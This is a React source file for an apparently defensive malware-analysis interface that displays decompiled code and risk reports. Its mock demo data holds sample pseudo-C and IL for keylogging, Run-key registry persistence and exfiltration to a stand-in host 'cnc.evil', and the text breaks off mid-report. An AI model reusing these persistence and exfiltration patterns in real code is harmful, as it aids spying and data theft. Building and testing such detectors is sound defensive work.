import React, { useState, useCallback, useMemo, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Terminal, Play, Cpu, FileCode2, FileText, Code2, X, ChevronLeft, ChevronRight, FileSearch } from "lucide-react";
import { useLocation, useNavigate, useParams } from "react-router-dom";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

const MIN_COL_WIDTH = 180;
const MAX_COL_WIDTH = 560;
const DEFAULT_LEFT_COL_WIDTH = 288;
const DEFAULT_RIGHT_COL_WIDTH = 224;
const REFERENCES_TIMEOUT_MS = 10000;
const GHIDRA_PROGRESS_PREFIX = "[GHIDRA_PROGRESS]";
import FileDropZone from "@/components/FileDropZone";
import CodePanel from "@/components/CodePanel";
import { openXrefExplorerTab, writeXrefSession } from "@/lib/cCodeXref";

const API_BASE = import.meta.env.VITE_API_URL || "http://localhost:8000";

export type AnalysisResult = {
  report: string;
  cCode: string;
  ilCode: string;
  fileName: string;
  riskScore: number;
  riskLevel: string;
  /** Indicadores (funções/strings) que deram flag para highlight no pseudo-C (vindo do backend). */
  flaggedIndicators?: string[];
  /** Resumo opcional de análise dinâmica (quando existir). */
  dynamicSummary?: string | null;
  /** Funções suspeitas com ranges exatos no pseudo-C (vindo do backend). */
  flaggedFunctions?: {
    name: string;
    id?: string;
    startLine: number;
    endLine: number;
    indicators?: string[];
    score?: number;
    scoreRaw?: number;
    severity?: string;
    reasons?: string[];
  }[];
  /** Caminho do ficheiro com trechos obfuscados extraídos (quando existir). */
  obfuscatedSnippetsFile?: string;
  /** Caminho do ficheiro com trechos deobfuscados (quando existir). */
  obfuscatedSnippetsDeobfuscatedFile?: string;
  /** Número de indicadores de ofuscação (corresponde à categoria Obfuscation do relatório). */
  obfuscationIndicatorCount?: number;
};

type AnalysisMode = "static" | "dynamic" | "both";

type ErrorResponse = { detail?: unknown };
type ValidationDetailItem = { msg?: unknown };

function stringifyDetail(detail: unknown): string {
  if (detail == null) return "";
  if (typeof detail === "string") return detail;
  if (Array.isArray(detail)) {
    return detail
      .map((d) => {
        if (typeof d === "string") return d;
        if (d && typeof d === "object" && "msg" in d) {
          const msg = (d as ValidationDetailItem).msg;
          return typeof msg === "string" ? msg : JSON.stringify(msg);
        }
        return JSON.stringify(d);
      })
      .join(", ");
  }
  try {
    return JSON.stringify(detail);
  } catch {
    return String(detail);
  }
}

function readErrorDetail(res: Response, fallbackText: string): Promise<string> {
  return res
    .json()
    .catch(() => ({ detail: fallbackText } satisfies ErrorResponse))
    .then((msg: ErrorResponse) => stringifyDetail(msg?.detail) || fallbackText);
}

function asRecord(v: unknown): Record<string, unknown> | null {
  return v && typeof v === "object" ? (v as Record<string, unknown>) : null;
}

export type ExpandedPanel = "c" | "il" | "report" | null;

export type ReportFlag = {
  label: string;
  line?: number;
  reportLineIndex?: number;
};

export type ReportCategory = {
  /** Linha de resumo, ex.: "Suspicious Imports: 3 ocorrências = 15/15 pontos" */
  label: string;
  /** ID estável para guardar o offset de navegação. */
  id: string;
  /** Linha do relatório onde o resumo aparece. */
  summaryLineIndex: number;
  /** Linhas de código associadas a esta categoria (ocorrências). */
  lineNumbers: number[];
};

export type ReportChapter = {
  label: string;
  line: number;
};

/** Constrói um AnalysisResult a partir do payload de um job da API /api/analysis. */
function buildAnalysisResultFromJob(job: unknown, fallbackFileName?: string): AnalysisResult | null {
  const fj = asRecord(job);
  if (!fj) return null;

  let staticResult: unknown = fj.staticResult ?? null;
  const dynamicResult = fj.dynamicResult ?? null;

  // Em alguns caminhos (ex.: histórico em SQLite) staticResult pode vir como string JSON.
  if (staticResult && typeof staticResult === "string") {
    try {
      staticResult = JSON.parse(staticResult);
    } catch {
      staticResult = null;
    }
  }

  if (staticResult && typeof staticResult === "object") {
    const sr = asRecord(staticResult) ?? {};
    const dr = dynamicResult && typeof dynamicResult === "object" ? asRecord(dynamicResult) : null;
    return {
      report: typeof sr.report === "string" ? sr.report : "",
      cCode: typeof sr.cCode === "string" ? sr.cCode : "",
      ilCode: typeof sr.ilCode === "string" ? sr.ilCode : "",
      fileName: typeof sr.fileName === "string" ? sr.fileName : fallbackFileName ?? "output",
      riskScore: typeof sr.riskScore === "number" ? sr.riskScore : 0,
      riskLevel: typeof sr.riskLevel === "string" ? sr.riskLevel : "",
      flaggedIndicators: Array.isArray(sr.flaggedIndicators)
        ? (sr.flaggedIndicators as unknown[]).filter((x): x is string => typeof x === "string")
        : [],
      flaggedFunctions: Array.isArray(sr.flaggedFunctions)
        ? (sr.flaggedFunctions as unknown[]).filter((x): x is Record<string, unknown> => !!x && typeof x === "object").map((f) => {
            const rf = asRecord(f) ?? {};
            return {
              name: typeof rf.name === "string" ? rf.name : "",
              id: typeof rf.id === "string" ? rf.id : undefined,
              startLine: typeof rf.startLine === "number" ? rf.startLine : 0,
              endLine: typeof rf.endLine === "number" ? rf.endLine : 0,
              indicators: Array.isArray(rf.indicators)
                ? (rf.indicators as unknown[]).filter((x): x is string => typeof x === "string")
                : [],
              score: typeof rf.score === "number" ? rf.score : undefined,
              scoreRaw: typeof rf.scoreRaw === "number" ? rf.scoreRaw : undefined,
              severity: typeof rf.severity === "string" ? rf.severity : undefined,
              reasons: Array.isArray(rf.reasons)
                ? (rf.reasons as unknown[]).filter((x): x is string => typeof x === "string")
                : [],
            };
          })
        : [],
      dynamicSummary: dr && typeof dr.dynamicSummary === "string" ? dr.dynamicSummary : null,
      obfuscatedSnippetsFile: typeof sr.obfuscatedSnippetsFile === "string" ? sr.obfuscatedSnippetsFile : undefined,
      obfuscatedSnippetsDeobfuscatedFile: typeof sr.obfuscatedSnippetsDeobfuscatedFile === "string" ? sr.obfuscatedSnippetsDeobfuscatedFile : undefined,
      obfuscationIndicatorCount: typeof sr.obfuscationIndicatorCount === "number" ? sr.obfuscationIndicatorCount : undefined,
    };
  }

  if (dynamicResult && typeof dynamicResult === "object") {
    const dr = asRecord(dynamicResult) ?? {};
    const dynamicSummary =
      typeof dr.dynamicSummary === "string" ? dr.dynamicSummary : "Análise dinâmica concluída.";
    const behaviorStr =
      dr.dynamicReport != null ? JSON.stringify(dr.dynamicReport, null, 2) : "";
    return {
      report: `# Análise dinâmica\n\n${dynamicSummary}\n\n${behaviorStr}`,
      cCode: "",
      ilCode: "",
      fileName: fallbackFileName ?? "output",
      riskScore: 0,
      riskLevel: "",
      flaggedIndicators: [],
      dynamicSummary,
    };
  }

  // Fallback: alguns payloads antigos podem trazer campos diretos no root.
  if (typeof fj.report === "string" || typeof fj.cCode === "string" || typeof fj.ilCode === "string") {
    return {
      report: typeof fj.report === "string" ? fj.report : "",
      cCode: typeof fj.cCode === "string" ? fj.cCode : "",
      ilCode: typeof fj.ilCode === "string" ? fj.ilCode : "",
      fileName: typeof fj.fileName === "string" ? fj.fileName : fallbackFileName ?? "output",
      riskScore: typeof fj.riskScore === "number" ? fj.riskScore : 0,
      riskLevel: typeof fj.riskLevel === "string" ? fj.riskLevel : "",
      flaggedIndicators: Array.isArray(fj.flaggedIndicators)
        ? (fj.flaggedIndicators as unknown[]).filter((x): x is string => typeof x === "string")
        : [],
      flaggedFunctions: Array.isArray(fj.flaggedFunctions)
        ? (fj.flaggedFunctions as unknown[]).filter((x): x is Record<string, unknown> => !!x && typeof x === "object").map((f) => {
            const rf = asRecord(f) ?? {};
            return {
              name: typeof rf.name === "string" ? rf.name : "",
              id: typeof rf.id === "string" ? rf.id : undefined,
              startLine: typeof rf.startLine === "number" ? rf.startLine : 0,
              endLine: typeof rf.endLine === "number" ? rf.endLine : 0,
              indicators: Array.isArray(rf.indicators)
                ? (rf.indicators as unknown[]).filter((x): x is string => typeof x === "string")
                : [],
              score: typeof rf.score === "number" ? rf.score : undefined,
              scoreRaw: typeof rf.scoreRaw === "number" ? rf.scoreRaw : undefined,
              severity: typeof rf.severity === "string" ? rf.severity : undefined,
              reasons: Array.isArray(rf.reasons)
                ? (rf.reasons as unknown[]).filter((x): x is string => typeof x === "string")
                : [],
            };
          })
        : [],
      dynamicSummary: null,
      obfuscatedSnippetsFile: typeof fj.obfuscatedSnippetsFile === "string" ? fj.obfuscatedSnippetsFile : undefined,
      obfuscatedSnippetsDeobfuscatedFile: typeof fj.obfuscatedSnippetsDeobfuscatedFile === "string" ? fj.obfuscatedSnippetsDeobfuscatedFile : undefined,
    };
  }

  return null;
}

/** Encontra blocos top-level no código C por matching de chavetas (funções ou blocos). */
function getCBlocks(code: string): { start: number; end: number }[] {
  const lines = code.split("\n");
  const blocks: { start: number; end: number }[] = [];
  let balance = 0;
  let blockStart = 0;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const open = (line.match(/\{/g) || []).length;
    const close = (line.match(/\}/g) || []).length;
    const prev = balance;
    balance += open - close;
    if (prev === 0 && balance >= 1) blockStart = i + 1;
    if (prev === 1 && balance === 0) {
      blocks.push({ start: blockStart, end: i + 1 });
    }
  }
  return blocks;
}

/** Junta intervalos sobrepostos ou adjacentes. */
function mergeRanges(ranges: { start: number; end: number }[]): { start: number; end: number }[] {
  if (ranges.length === 0) return [];
  const sorted = [...ranges].sort((a, b) => a.start - b.start);
  const out: { start: number; end: number }[] = [sorted[0]];
  for (let i = 1; i < sorted.length; i++) {
    const cur = sorted[i];
    const last = out[out.length - 1];
    if (cur.start <= last.end + 1) {
      last.end = Math.max(last.end, cur.end);
    } else {
      out.push(cur);
    }
  }
  return out;
}

/** Devolve o bloco (função) que contém a linha dada. */
function getBlockContainingLine(
  code: string,
  lineNumber: number
): { start: number; end: number } | null {
  const blocks = getCBlocks(code);
  for (const block of blocks) {
    if (lineNumber >= block.start && lineNumber <= block.end) return block;
  }
  return null;
}

/** Calcula que intervalos do código C mostrar a partir de funções suspeitas. */
function getCDisplayRanges(
  cCode: string,
  flaggedFunctions: { startLine: number; endLine: number }[] | undefined | null
): { start: number; end: number }[] | undefined {
  if (!flaggedFunctions || flaggedFunctions.length === 0) return undefined;
  const ranges = flaggedFunctions
    .map((f) => ({
      start: Math.max(1, f.startLine),
      end: Math.max(f.startLine, f.endLine),
    }))
    .filter((r) => r.start <= r.end);
  if (ranges.length === 0) return undefined;
  return mergeRanges(ranges);
}

/** Estatísticas de uma palavra selecionada no código (menções, tipo inferido, funções). */
export type WordStats = {
  mentions: number;
  inferredType: string | null;
  functionsCount: number;
  maliciousCount: number;
};

function escapeRegex(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function getWordStats(
  code: string,
  word: string,
  maliciousRanges: { start: number; end: number }[] | undefined
): WordStats {
  if (!word || word.length < 2) {
    return { mentions: 0, inferredType: null, functionsCount: 0, maliciousCount: 0 };
  }
  const escaped = escapeRegex(word);
  const re = new RegExp("\\b" + escaped + "\\b", "g");
  const mentions = (code.match(re) || []).length;

  const lines = code.split("\n");
  let inferredType: string | null = null;

  // 1) Declaração C: tipo + palavra (int x, void foo, ...)
  const cTypeRe = new RegExp(
    "\\b(int|void|char|long|short|float|double|bool|unsigned|size_t|uint\\w*|struct\\s+\\w+)\\s+" + escaped + "\\b"
  );
  for (const line of lines) {
    const m = cTypeRe.exec(line);
    if (m) {
      inferredType = m[1].trim().replace(/\s+/g, " ");
      break;
    }
  }

  // 2) Declaração C#/.NET: string, var, List<>, etc. + palavra
  if (!inferredType) {
    const csTypeRe = new RegExp(
      "\\b(string|var|bool|int|long|float|double|object|byte|sbyte|ushort|uint|ulong|decimal)\\s+" + escaped + "\\b"
    );
    for (const line of lines) {
      const m = csTypeRe.exec(line);
      if (m) {
        inferredType = m[1];
        break;
      }
    }
  }

  // 3) Parâmetro: ( tipo palavra ) ou , tipo palavra, ou ) palavra )
  if (!inferredType) {
    const paramRe = new RegExp(
      "[,(]\\s*(?:const\\s+)?(?:int|void|char|long|short|float|double|bool|unsigned|string|var)\\s+" + escaped + "\\s*[),]",
      "i"
    );
    if (paramRe.test(code)) inferredType = "parâmetro";
  }

  // 4) Chamada: palavra( -> função
  if (!inferredType && new RegExp("\\b" + escaped + "\\s*\\(").test(code)) {
    inferredType = "função";
  }

  // 5) Acesso membro: .palavra ou ->palavra (campo/propriedade)
  if (!inferredType && new RegExp("[.->]\\s*" + escaped + "\\b").test(code)) {
    inferredType = "campo/propriedade";
  }

  // 6) Ponteiro C: * palavra ou palavra *
  if (!inferredType && new RegExp("\\*\\s*" + escaped + "\\b|\\b" + escaped + "\\s*\\*").test(code)) {
    inferredType = "ponteiro";
  }

  // 7) Variável de ciclo: for ( tipo palavra ; ou for ( ; palavra ;
  if (!inferredType) {
    if (new RegExp("for\\s*\\([^)]*\\b" + escaped + "\\b[^)]*\\)").test(code)) {
      inferredType = "variável de ciclo";
    }
  }

  // 8) IL: .locals ( tipo palavra )
  if (!inferredType && new RegExp("\\.locals\\s*\\([^)]*\\b" + escaped + "\\b", "i").test(code)) {
    inferredType = "local (IL)";
  }

  const blocks = getCBlocks(code);
  let functionsCount = 0;
  let maliciousCount = 0;
  for (const block of blocks) {
    const blockLines = lines.slice(block.start - 1, block.end).join("\n");
    if (new RegExp("\\b" + escaped + "\\b").test(blockLines)) {
      functionsCount++;
      const isMalicious = maliciousRanges?.some(
        (r) => block.start >= r.start && block.end <= r.end
      );
      if (isMalicious) maliciousCount++;
    }
  }

  return { mentions, inferredType, functionsCount, maliciousCount };
}

/** Agrupa o relatório em categorias tipo "Suspicious Imports: 3 ocorrências = 15/15 pontos". */
function parseReportCategories(report: string): ReportCategory[] {
  const lines = report.split("\n");
  const categories: ReportCategory[] = [];
  const summaryRe = /:\s*\d+\s+ocorr/i; // procura "...: N ocorr..."
  const lineNumRe = /(?:linha|line)\s*(\d+)/i;

  let current: ReportCategory | null = null;

  lines.forEach((line, i) => {
    const trimmed = line.trim();
    if (!trimmed) return;

    if (summaryRe.test(trimmed)) {
      const id = `${trimmed}-${i + 1}`;
      current = {
        id,
        label: trimmed,
        summaryLineIndex: i + 1,
        lineNumbers: [],
      };
      categories.push(current);
      return;
    }

    if (current) {
      const m = lineNumRe.exec(line);
      if (m) {
        const n = parseInt(m[1], 10);
        if (!Number.isNaN(n)) current.lineNumbers.push(n);
      }
    }
  });

  return categories;
}

/** Extrai do relatório secções e itens como "flags" (marcadores) para navegação e teleporte no código */
function parseReportFlags(report: string): ReportFlag[] {
  const lines = report.split("\n");
  const flags: ReportFlag[] = [];
  const lineNumRe = /(?:linha|line)\s*(\d+)/i;
  lines.forEach((line, i) => {
    const trimmed = line.trim();
    if (!trimmed) return;
    const isHeading = trimmed.startsWith("##") || trimmed.startsWith("# ");
    const isBullet = trimmed.startsWith("- ") || trimmed.startsWith("• ");
    if (!isHeading && !isBullet) return;
    const label = trimmed.replace(/^#+\s*/, "").replace(/^[-•]\s*/, "").trim();
    if (!label) return;
    const lineMatch = lineNumRe.exec(line);
    const lineNum = lineMatch ? parseInt(lineMatch[1], 10) : undefined;
    flags.push({
      label: label.slice(0, 80) + (label.length > 80 ? "…" : ""),
      line: lineNum,
      reportLineIndex: i + 1,
    });
  });
  return flags;
}

/** Extrai os "capítulos" principais do relatório (RESUMO, SCORE DE RISCO, ANÁLISE ESTÁTICA, etc.) */
function parseReportChapters(report: string): ReportChapter[] {
  const lines = report.split("\n");
  const chapters: ReportChapter[] = [];
  lines.forEach((line, i) => {
    const trimmed = line.trim();
    if (!trimmed) return;
    if (/^[=-]{5,}$/.test(trimmed)) return;
    const isAllCaps =
      /^[A-Z0-9ÁÀÂÃÉÈÊÍÓÔÕÚÇ ,./()-]+$/.test(trimmed) && trimmed.length <= 80;
    if (!isAllCaps) return;
    chapters.push({
      label: trimmed,
      line: i + 1,
    });
  });
  return chapters;
}

/** Um par antes/depois da deobfuscação (um "caso"). */
export type SnippetPair = { before: string; after: string; description?: string };

/**
 * Faz o parse do conteúdo de ficheiro de snippets (formato backend: "--- snippet N ---", metadata, depois código).
 * Devolve array de { description?, code }.
 */
function parseSnippetFileSections(text: string): { description?: string; code: string }[] {
  if (!text?.trim()) return [];
  const sections = text.split(/\n--- snippet \d+ ---\n/).filter(Boolean);
  return sections.map((block) => {
    const firstDoubleNewline = block.indexOf("\n\n");
    const meta = firstDoubleNewline >= 0 ? block.slice(0, firstDoubleNewline) : "";
    const code = (firstDoubleNewline >= 0 ? block.slice(firstDoubleNewline + 2) : block).trim();
    const descMatch = meta.match(/description:\s*(.+)/);
    const description = descMatch ? descMatch[1].trim() : undefined;
    return { description, code };
  });
}

/** Junta listas de snippets obfuscados e deobfuscados em pares antes/depois (por índice). */
function zipSnippetPairs(
  obfSections: { description?: string; code: string }[],
  deobSections: { description?: string; code: string }[]
): SnippetPair[] {
  const maxLen = Math.max(obfSections.length, deobSections.length);
  const pairs: SnippetPair[] = [];
  for (let i = 0; i < maxLen; i++) {
    const obf = obfSections[i];
    const deob = deobSections[i];
    pairs.push({
      before: obf?.code ?? "",
      after: deob?.code ?? "",
      description: obf?.description ?? deob?.description,
    });
  }
  return pairs.filter((p) => p.before.trim() || p.after.trim());
}

/** Extrai a secção "Indicadores de Ofuscação" do relatório para mostrar quando não há ficheiro de trechos. */
function extractObfuscationIndicatorsFromReport(report: string): string | null {
  if (!report?.trim()) return null;
  const lines = report.split("\n");
  const out: string[] = [];
  let inSection = false;
  for (const line of lines) {
    const trimmed = line.trim();
    if (/Indicadores de [Oo]fuscação/i.test(trimmed)) {
      inSection = true;
      out.push("Indicadores de ofuscação (secção DEOBFUSCAÇÃO do relatório):");
      out.push("");
      continue;
    }
    if (inSection) {
      if (!trimmed) break;
      if (trimmed.startsWith("-") || trimmed.startsWith("  -")) {
        out.push(trimmed.replace(/^[\s-]+/, "  • "));
      } else if (/^[-=]{2,}$/.test(trimmed)) break;
      else out.push(trimmed);
    }
  }
  if (out.length <= 2) return null;
  return out.join("\n");
}

const Index = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { jobId: jobIdFromPath } = useParams<{ jobId?: string }>();
  const [file, setFile] = useState<File | null>(null);
  const [fileContent, setFileContent] = useState<string>("");
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [analysisResult, setAnalysisResult] = useState<AnalysisResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [analysisLogs, setAnalysisLogs] = useState<string[]>([]);
  const [expandedPanel, setExpandedPanel] = useState<ExpandedPanel>(null);
  const [scrollToLine, setScrollToLine] = useState<number | null>(null);
  const [windowFocusLine, setWindowFocusLine] = useState<number | null>(null);
  const [categoryOffsets, setCategoryOffsets] = useState<Record<string, number>>({});
  const [selectedWord, setSelectedWord] = useState<string | null>(null);
  const [leftColWidth, setLeftColWidth] = useState(DEFAULT_LEFT_COL_WIDTH);
  const [rightColWidth, setRightColWidth] = useState(DEFAULT_RIGHT_COL_WIDTH);
  const resizeRef = useRef<{ side: "left" | "right"; startX: number; startLeft: number; startRight: number } | null>(null);
  const [referencesRemainingMs, setReferencesRemainingMs] = useState<number>(0);
  const referencesTimerRef = useRef<number | null>(null);
  const [ghidraProgress, setGhidraProgress] = useState<number | null>(null);
  const [overviewCategoryIndex, setOverviewCategoryIndex] = useState(0);
  const [analysisMode, setAnalysisMode] = useState<AnalysisMode>("static");
  const [externalJobLoaded, setExternalJobLoaded] = useState(false);
  const [lastExternalJobId, setLastExternalJobId] = useState<string | null>(null);
  const [resultJobId, setResultJobId] = useState<string | null>(null);
  const [activeCFunctionId, setActiveCFunctionId] = useState<string | null>(null);
  const [activeFlaggedFunctionIndex, setActiveFlaggedFunctionIndex] = useState<number>(0);
  const [flaggedFunctionsOrder, setFlaggedFunctionsOrder] = useState<"code" | "severity">("code");
  const suppressAutoScrollRef = useRef(false);
  const [snippetModal, setSnippetModal] = useState<{
    open: boolean;
    title: string;
    pairs: SnippetPair[];
    currentIndex: number;
    fallbackContent?: string;
  }>({
    open: false,
    title: "",
    pairs: [],
    currentIndex: 0,
  });

  const handleFileLoaded = useCallback((f: File, content: string) => {
    setFile(f);
    setFileContent(content);
    setShowResults(false);
    setAnalysisResult(null);
    setError(null);
    setAnalysisLogs([]);
    setGhidraProgress(null);
  }, []);

  const handleClear = useCallback(() => {
    setFile(null);
    setFileContent("");
    setShowResults(false);
    setAnalysisResult(null);
    setError(null);
    setAnalysisLogs([]);
    setGhidraProgress(null);
    setExternalJobLoaded(false);
    setLastExternalJobId(null);
    setResultJobId(null);

    // Quando o utilizador clica em "Nova Análise", limpamos o jobId da query string
    // e voltamos explicitamente para a landing page (/), para evitar que o efeito de
    // job externo volte a forçar a vista de resultados.
    navigate("/", { replace: true });
  }, [navigate]);

  const isCS = file?.name.endsWith(".cs");

  // Suporte a arranque externo (por exemplo, WPF) que abre o site já com um jobId na query string.
  useEffect(() => {
    const params = new URLSearchParams(location.search ?? "");
    const jobIdFromQuery = params.get("jobId");
    const jobId = jobIdFromPath ?? jobIdFromQuery;
    if (!jobId) return;
    if (jobId === lastExternalJobId) return;

    let cancelled = false;

    const loadExternalJob = async () => {
      // DEBUG: inspeção do fluxo de carregamento externo via query ?jobId=...
      console.log("[RAT-UI] loadExternalJob start", { API_BASE, jobId });
      // Assim que começamos a carregar um job externo, já mostramos o layout de resultados,
      // evitando um segundo efeito separado só para forçar showResults=true.
      setShowResults(true);
      setIsAnalyzing(true);
      setError(null);
      setAnalysisLogs([]);
      setAnalysisLogs((prev) => [
        ...prev,
        `A carregar resultados externos para jobId=${jobId} a partir de ${API_BASE}...`,
      ]);

      const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

      try {
        // Canonicalizar URL: se vier de query (?jobId=...), troca para /analysis/:jobId
        if (!cancelled && !jobIdFromPath && jobIdFromQuery) {
          navigate(`/analysis/${encodeURIComponent(jobId)}`, { replace: true });
        }

        let attempts = 0;
        const maxAttempts = 300; // ~5 minutos de espera máxima
        let finalJob: unknown = null;

        while (!cancelled && attempts < maxAttempts) {
          attempts += 1;
          const res = await fetch(`${API_BASE}/api/analysis/${encodeURIComponent(jobId)}`);
          if (!res.ok) {
            const text = await readErrorDetail(res, res.statusText);
            if (!cancelled) {
              setError(text || "Falha ao carregar resultados da análise externa.");
            }
            console.error("[RAT-UI] loadExternalJob fetch error", {
              jobId,
              status: res.status,
              statusText: res.statusText,
            });
            return;
          }

          const job: unknown = await res.json();
          finalJob = job;
          const fj = asRecord(job);
          const status = typeof fj?.status === "string" ? fj.status : "desconhecido";

          console.log("[RAT-UI] loadExternalJob poll", {
            jobId,
            attempt: attempts,
            status,
            job,
          });

          if (status === "queued" || status === "running") {
            if (!cancelled && (attempts === 1 || attempts % 10 === 0)) {
              setAnalysisLogs((prev) => [
                ...prev,
                `Job externo ainda em processamento (estado atual: ${status}, tentativa ${attempts}).`,
              ]);
            }
            await sleep(1000);
            continue;
          }

          if (status === "failed") {
            const err =
              (fj && typeof fj.error === "string" ? fj.error : null) ??
              "Análise externa falhou no backend.";
            if (!cancelled) {
              setError(err);
            }
            return;
          }

          // Quando sair do ciclo com status diferente de queued/running/failed, consideramos finalizado.
          break;
        }

        if (cancelled) return;

        if (!finalJob) {
          setError("Timeout ao aguardar conclusão da análise externa.");
          return;
        }

        const root = asRecord(finalJob);
        console.log("[RAT-UI] loadExternalJob finalJob", { jobId, root });
        const chosen = buildAnalysisResultFromJob(finalJob, root?.fileName as string | undefined);
        console.log("[RAT-UI] loadExternalJob chosen AnalysisResult", { jobId, chosen });

        if (!chosen) {
          setError("Nenhum resultado disponível para o job externo.");
          return;
        }

        setAnalysisResult(chosen);
        setShowResults(true);
        setExternalJobLoaded(true);
        setLastExternalJobId(jobId);
      } catch (e) {
        if (!cancelled) {
          setError(e instanceof Error ? e.message : "Erro ao carregar resultados externos.");
        }
      } finally {
        if (!cancelled) {
          setIsAnalyzing(false);
        }
      }
    };

    void loadExternalJob();

    return () => {
      cancelled = true;
    };
  }, [location.search, lastExternalJobId, jobIdFromPath, navigate]);

  // Demo rápida com resultado mock, para testar o layout das 3 colunas sem chamar o backend
  const loadMockDemo = useCallback(() => {
    const demo: AnalysisResult = {
      fileName: "demo.cs",
      cCode: [
        "// pseudo-C gerado a partir de .NET (mock)",
        "#include <stdio.h>",
        "#include <windows.h>",
        "#include <wininet.h>",
        "",
        "int read_config() {",
        "    FILE *f = fopen(\"config.ini\", \"r\");",
        "    if (!f) {",
        "        printf(\"[!] Falha ao abrir config.ini\\\\n\");",
        "        return -1;",
        "    }",
        "    char buf[256];",
        "    while (fgets(buf, sizeof(buf), f)) {",
        "        printf(\"[cfg] %s\", buf);",
        "    }",
        "    fclose(f);",
        "    return 0;",
        "}",
        "",
        "// String ofuscada: concatenação em runtime",
        "char* get_c2_url() {",
        "    char *a = \"ht\";",
        "    char *b = \"tp\";",
        "    char *c = \"s://\";",
        "    char *d = \"cnc.evil\\\\n\";",
        "    return strcat(strcat(strcat(a, b), c), d);",
        "}",
        "",
        "int capture_keystrokes() {",
        "    SHORT state = GetAsyncKeyState(VK_SHIFT);",
        "    if (state & 0x8000) {",
        "        GetAsyncKeyState(VK_CONTROL);",
        "        printf(\"[key] shift+ctrl\\\\n\");",
        "    }",
        "    return 0;",
        "}",
        "",
        "void persist_registry() {",
        "    HKEY hk;",
        "    RegOpenKeyExA(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_SET_VALUE, &hk);",
        "    RegSetValueExA(hk, \"Updater\", 0, REG_SZ, (BYTE*)\"C:\\\\evil.exe\", 12);",
        "    RegCloseKey(hk);",
        "}",
        "",
        "void suspicious_function() {",
        "    HANDLE h = CreateFileA(\"log.txt\", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);",
        "    if (h == INVALID_HANDLE_VALUE) return;",
        "    const char *msg = \"dados suspeitos\";",
        "    DWORD written = 0;",
        "    WriteFile(h, msg, (DWORD)strlen(msg), &written, NULL);",
        "    CloseHandle(h);",
        "}",
        "",
        "void exfil_data(const char *path) {",
        "    HINTERNET hi = InternetOpenA(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);",
        "    HINTERNET url = InternetOpenUrlA(hi, get_c2_url(), NULL, 0, 0, 0);",
        "    if (url) { InternetCloseHandle(url); }",
        "    InternetCloseHandle(hi);",
        "}",
        "",
        "int main() {",
        "    read_config();",
        "    capture_keystrokes();",
        "    persist_registry();",
        "    suspicious_function();",
        "    exfil_data(\"C:\\\\data\\\\\");",
        "    return 0;",
        "}",
      ].join("\n"),
      ilCode: [
        "// IL/Bytecode de exemplo (mock)",
        ".method public hidebysig static void  Main() cil managed",
        "{",
        "  .entrypoint",
        "  .maxstack  2",
        "  .locals init ([0] string msg, [1] int32 V_1)",
        "  IL_0000:  ldstr      \"Hello world\"",
        "  IL_0005:  stloc.0",
        "  IL_0006:  call       void Program::ReadConfig()",
        "  IL_000b:  call       void Program::CaptureKeystrokes()",
        "  IL_0010:  call       void Program::PersistRegistry()",
        "  IL_0015:  call       void Program::SuspiciousFunction()",
        "  IL_001a:  ldstr      \"C:\\\\data\\\\\"",
        "  IL_001f:  call       void Program::ExfilData(string)",
        "  IL_0024:  ldc.i4.0",
        "  IL_0025:  ret",
        "}",
        ".method private hidebysig static void ReadConfig() cil managed",
        "{",
        "  .maxstack 2",
        "  IL_0000:  ldstr \"config.ini\"",
        "  IL_0005:  call class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::OpenRead(string)",
        "  IL_000a:  pop",
        "  IL_000b:  ret",
        "}",
        ".method private hidebysig static void CaptureKeystrokes() cil managed",
        "{",
        "  .maxstack 8",
        "  IL_0000:  ldc.i4.s 0x10",
        "  IL_0002:  call int32 [System]System.Windows.Forms.Keys::get_ShiftKey()",
        "  IL_0007:  call int32 [user32]GetAsyncKeyState(int32)",
        "  IL_000c:  pop",
        "  IL_000d:  ret",
        "}",
        ".method private hidebysig static void PersistRegistry() cil managed",
        "{",
        "  .maxstack 4",
        "  IL_0000:  ldstr \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"",
        "  IL_0005:  ldc.i4.1",
        "  IL_0006:  call class [Microsoft.Win32]Microsoft.Win32.RegistryKey [Microsoft.Win32]Microsoft.Win32.Registry::OpenSubKey(string, bool)",
        "  IL_000b:  ldstr \"Updater\"",
        "  IL_0010:  ldstr \"C:\\\\evil.exe\"",
        "  IL_0015:  callvirt instance void RegistryKey::SetValue(string, object)",
        "  IL_001a:  ret",
        "}",
        ".method private hidebysig static void ExfilData(string path) cil managed",
        "{",
        "  .maxstack 2",
        "  IL_0000:  ldarg.0",
        "  IL_0001:  call class [System.Net]System.Net.WebClient [System.Net]WebClient::Create()",
        "  IL_0006:  ldstr \"https://cnc.evil/upload\"",
        "  IL_000b:  callvirt instance void WebClient::UploadString(string, string)",
        "  IL_0010:  ret",
        "}",
      ].join("\n"),
      report: [
        "RELATÓRIO DE ANÁLISE ESTÁTICA (mock)",
        "=====================================",
        "",
        "INFORMAÇÕES DO FICHEIRO",
        "Nome: demo.cs",
        "Tamanho: 128 KB (estimado)",
        "MD5: a1b2c3d4e5f6789012345678901234ab",
        "SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
        "Tipo: .NET assembly (C#) com pseudo-C gerado a partir de IL",
        "",
        "SCORE DE RISCO GLOBAL",
        "Score: 92/100",
        "Nível: CRÍTICO",
        "Descrição: o ficheiro apresenta múltiplos indicadores de RAT/stealer: keylogging, persistência por registo, exfiltração de dados, C2 e ofuscação de strings.",
        "",
        "Detalhes do Score:",
        "  - Suspicious Imports: 4 ocorrências = 15/15 pontos",
        "  - Suspicious Functions: 6 ocorrências = 18/18 pontos",
        "  - File I/O suspeito: 3 ocorrências = 10/10 pontos",
